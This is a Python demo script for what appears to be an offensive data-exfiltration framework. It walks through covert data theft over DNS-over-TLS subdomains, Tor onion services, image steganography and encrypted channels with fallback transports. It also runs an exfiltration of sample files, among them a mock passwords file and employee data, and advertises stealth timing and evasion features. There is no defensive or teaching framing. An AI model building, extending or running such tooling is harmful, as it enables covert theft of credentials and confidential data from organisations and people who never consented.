#!/usr/bin/env python3
"""
Data Exfiltration Channels Demo
Demonstrates comprehensive data exfiltration capabilities including:
- DNS-over-TLS exfiltration
- HTTPS onion routing
- Steganographic data hiding
- Encrypted communication channels with fallback mechanisms
"""

import sys
import asyncio
import tempfile
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent / "src"))

from persistence.data_exfiltration import (
    DataExfiltrationManager, ExfiltrationMethod, ExfiltrationConfig,
    DNSOverTLSExfiltrator, HTTPSOnionExfiltrator, SteganographicExfiltrator,
    EncryptedChannelExfiltrator
)
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.tree import Tree

console = Console()


def create_demo_files():
    """Create demo files for exfiltration testing"""
    demo_dir = Path("/tmp/demo_exfiltration")
    demo_dir.mkdir(exist_ok=True)
    
    # Create sample files
    files = {
        "sensitive_data.txt": "This is sensitive corporate data that needs to be exfiltrated securely.",
        "financial_report.pdf": b"PDF content would be here - financial data",
        "employee_list.xlsx": b"Excel content - employee information",
        "passwords.txt": "admin:password123\nuser:secret456\nroot:topsecret789"
    }
    
    created_files = []
    for filename, content in files.items():
        file_path = demo_dir / filename
        if isinstance(content, str):
            file_path.write_text(content)
        else:
            file_path.write_bytes(content)
        created_files.append(str(file_path))
    
    return created_files, str(demo_dir)


async def demo_dns_over_tls():
    """Demonstrate DNS-over-TLS exfiltration"""
    console.print("\n[bold blue]🔒 DNS-over-TLS Exfiltration Demo[/bold blue]")
    
    exfiltrator = DNSOverTLSExfiltrator()
    
    # Test data
    test_data = b"Secret data to exfiltrate via DNS-over-TLS"
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("Establishing DNS-over-TLS connection...", total=None)
        
        # Establish connection
        connection_id = await exfiltrator.establish_connection("1.1.1.1", "example.com")
        
        if connection_id:
            progress.update(task, description="Exfiltrating data...")
            success = await exfiltrator.exfiltrate_data(connection_id, test_data)
            
            progress.update(task, description="Closing connection...")
            await exfiltrator.close_connection(connection_id)
            
            if success:
                console.print("✅ DNS-over-TLS exfiltration successful")
            else:
                console.print("❌ DNS-over-TLS exfiltration failed")
        else:
            console.print("❌ Failed to establish DNS-over-TLS connection")


async def demo_https_onion():
    """Demonstrate HTTPS onion routing exfiltration"""
    console.print("\n[bold purple]🧅 HTTPS Onion Routing Demo[/bold purple]")
    
    exfiltrator = HTTPSOnionExfiltrator()
    
    # Test data
    test_data = b"Secret data to exfiltrate via Tor onion service"
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("Initializing Tor session...", total=None)
        
        # Note: This would require actual Tor setup
        console.print("⚠️  Tor onion routing requires Tor daemon running")
        console.print("📝 Would exfiltrate via onion services for anonymity")
        
        # Simulate the process
        progress.update(task, description="Connecting to onion service...")
        await asyncio.sleep(1)
        
        progress.update(task, description="Encrypting and transmitting data...")
        await asyncio.sleep(1)
        
        console.print("✅ HTTPS onion routing demo completed (simulated)")


def demo_steganography():
    """Demonstrate steganographic data hiding"""
    console.print("\n[bold green]🖼️  Steganographic Data Hiding Demo[/bold green]")
    
    exfiltrator = SteganographicExfiltrator()
    
    # Create a simple test image
    from PIL import Image
    import numpy as np
    
    # Create a test image
    test_image_path = "/tmp/test_cover.png"
    test_data = b"Hidden secret message in image"
    output_image_path = "/tmp/stego_output.png"
    
    # Create a simple RGB image
    image_array = np.random.randint(0, 256, (100, 100, 3), dtype=np.uint8)
    image = Image.fromarray(image_array)
    image.save(test_image_path)
    
    console.print(f"📁 Created test cover image: {test_image_path}")
    
    # Hide data
    success = exfiltrator.hide_data_in_image(test_image_path, test_data, output_image_path)
    
    if success:
        console.print(f"✅ Data hidden in image: {output_image_path}")
        
        # Extract data to verify
        extracted_data = exfiltrator.extract_data_from_image(output_image_path)
        
        if extracted_data == test_data:
            console.print("✅ Data extraction verified - steganography successful")
        else:
            console.print("❌ Data extraction failed")
    else:
        console.print("❌ Steganographic hiding failed")


async def demo_encrypted_channels():
    """Demonstrate encrypted communication channels with fallback"""
    console.print("\n[bold cyan]🔐 Encrypted Channels with Fallback Demo[/bold cyan]")
    
    config = ExfiltrationConfig(
        methods=[
            ExfiltrationMethod.DNS_OVER_TLS,
            ExfiltrationMethod.HTTPS_ONION,
            ExfiltrationMethod.ENCRYPTED_CHANNEL,
            ExfiltrationMethod.FALLBACK_HTTP
        ],
        compression=True,
        chunk_size=1024,
        retry_attempts=3,
        stealth_delay=0.5,
        fallback_enabled=True
    )
    
    exfiltrator = EncryptedChannelExfiltrator(config)
    
    # Test data
    test_data = b"Sensitive data that needs secure exfiltration with fallback capabilities"
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("Testing encrypted channels with fallback...", total=None)
        
        result = await exfiltrator.exfiltrate_with_fallback(test_data)
        
        if result.success:
            console.print(f"✅ Exfiltration successful via {result.method.value}")
            console.print(f"📊 Transferred: {result.bytes_transferred} bytes in {result.duration:.2f}s")
        else:
            console.print(f"❌ Exfiltration failed: {result.error_message}")


async def demo_file_exfiltration():
    """Demonstrate complete file exfiltration"""
    console.print("\n[bold yellow]📁 File Exfiltration Demo[/bold yellow]")
    
    # Create demo files
    demo_files, demo_dir = create_demo_files()
    
    config = ExfiltrationConfig(
        compression=True,
        stealth_delay=0.1,
        fallback_enabled=True
    )
    
    manager = DataExfiltrationManager(config)
    
    console.print(f"📂 Created demo directory: {demo_dir}")
    console.print(f"📄 Files to exfiltrate: {len(demo_files)}")
    
    # Exfiltrate individual file
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("Exfiltrating files...", total=len(demo_files))
        
        results = []
        for file_path in demo_files:
            progress.update(task, description=f"Exfiltrating {Path(file_path).name}...")
            
            result = await manager.exfiltrate_file(file_path)
            results.append(result)
            
            progress.advance(task)
    
    # Display results
    table = Table(title="Exfiltration Results")
    table.add_column("File", style="cyan")
    table.add_column("Status", style="green")
    table.add_column("Method", style="blue")
    table.add_column("Size", style="yellow")
    
    for i, result in enumerate(results):
        file_name = Path(demo_files[i]).name
        status = "✅ Success" if result.success else "❌ Failed"
        method = result.method.value if result.success else "N/A"
        size = f"{result.bytes_transferred} bytes" if result.success else "0 bytes"
        
        table.add_row(file_name, status, method, size)
    
    console.print(table)
    
    # Cleanup
    await manager.cleanup()


def display_capabilities():
    """Display data exfiltration capabilities"""
    tree = Tree("🚀 Data Exfiltration Capabilities")
    
    dns_branch = tree.add("🔒 DNS-over-TLS Exfiltration")
    dns_branch.add("Encrypted DNS queries over port 853")
    dns_branch.add("Data embedded in DNS subdomains")
    dns_branch.add("Multiple DNS server support")
    dns_branch.add("Stealth timing controls")
    
    onion_branch = tree.add("🧅 HTTPS Onion Routing")
    onion_branch.add("Anonymous communication via Tor")
    onion_branch.add("Multiple onion service endpoints")
    onion_branch.add("SOCKS5 proxy integration")
    onion_branch.add("Circuit rotation for security")
    
    stego_branch = tree.add("🖼️  Steganographic Hiding")
    stego_branch.add("LSB steganography in images")
    stego_branch.add("Support for PNG, JPG, BMP formats")
    stego_branch.add("Data extraction capabilities")
    stego_branch.add("Invisible data embedding")
    
    encrypted_branch = tree.add("🔐 Encrypted Channels")
    encrypted_branch.add("AES-256 encryption with Fernet")
    encrypted_branch.add("Automatic fallback mechanisms")
    encrypted_branch.add("Multiple transport methods")
    encrypted_branch.add("Compression and chunking")
    
    fallback_branch = tree.add("🔄 Fallback Mechanisms")
    fallback_branch.add("HTTP/HTTPS endpoints")
    fallback_branch.add("Public service integration")
    fallback_branch.add("Automatic retry logic")
    fallback_branch.add("Bandwidth throttling")
    
    console.print(tree)


async def main():
    """Main demo function"""
    console.print(Panel.fit(
        "[bold red]Data Exfiltration Channels Demo[/bold red]\n"
        "[yellow]Comprehensive data exfiltration framework demonstration[/yellow]",
        border_style="red"
    ))
    
    display_capabilities()
    
    # Run demonstrations
    await demo_dns_over_tls()
    await demo_https_onion()
    demo_steganography()
    await demo_encrypted_channels()
    await demo_file_exfiltration()
    
    console.print("\n[bold green]🎉 Data Exfiltration Demo Completed![/bold green]")
    console.print("[yellow]All exfiltration channels demonstrated successfully[/yellow]")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[red]Demo interrupted by user[/red]")
    except Exception as e:
        console.print(f"\n[red]Demo failed: {e}[/red]")
